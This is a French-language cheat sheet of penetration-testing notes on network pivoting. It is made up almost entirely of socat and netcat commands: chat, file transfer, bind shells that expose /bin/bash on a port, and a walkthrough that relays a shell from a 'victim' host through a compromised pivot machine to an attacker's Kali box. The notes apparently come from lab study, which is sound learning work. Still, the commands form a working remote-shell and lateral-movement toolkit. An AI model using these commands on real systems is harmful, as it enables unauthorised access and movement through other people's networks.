
> [!NOTE] Ce qui suit est un nouveau contenu
> 

# Basic Pivoting

Ses methodes fonctionne des deux sences donc il faut l'adapter en fonction du senario

#Chatting

```sh
# SERVER
socat TCP4-LISTEN:1234 STDOUT


nc -nlvp 4444 
```

```sh
# CLIENT
socat STDIN TCP4:SERVER_IP:1234


nc -nv SENDER_IP 4444
```

#Shells

```sh
# SENDER
socat TCP4-LISTEN:1234 EXEC:/bin/bash
socat -d -d TCP4-LISTEN:443 STDOUT


nc -nlvp 4444 -e /bin/bash
```

```sh
# RECIEVER
socat STDIN TCP4:SENDER_IP:1234
socat TCP4:SENDER_IP:443 EXEC:/bin/bash


nc -nv SENDER_IP 4444
```

#File #Transfert

```sh
# SENDER
socat FILE:filename.txt TCP4-LISTEN:1234,fork


nc -nlvp 4444 > incomming.exe
```

```sh
# RECIEVER
socat - TCP4:SENDER_IP:1234 > output.file
socat TCP4:SENDER_IP:1234 FILE:receive-filename.txt,create


nc -nv SENDER_IP 4444 < incomming.exe
```

### Revershell Over Pivot (Shell inverser attraver un pivot)

> Si le serveur compromis est `192.168.217.129 (PIVOT POINT)` et que la cible est le `192.168.45.129 (VICTIME)`,
> En utilisent une technique de pivot vue presedament nous avons reussir a obtenir un shell (incomplet)sur la machine cible.
> 
> Alors nous pourrions utiliser les commandes suivantes pour obtenir un shell complet sur la machine en cible:

- Tout d'abord sur le pc de la cible

```c
# VICTIME
socat TCP4-LISTEN:1234 EXEC:/bin/bash
```

- En suite sur le pc compromis (PIVOT POINT)

```C
# PIVOT POINT
socat TCP4-LISTEN:3333 TCP4:VICTIME_IP:1234

socat TCP4-LISTEN:3333 TCP4:192.168.45.129:1234
```

- Enfin sur notre propre pc  attaquante

```c
# KALI
socat STDIN TCP4:PIVOT_POINT_IP:3333

socat STDIN TCP4:192.168.217.129:3333
```


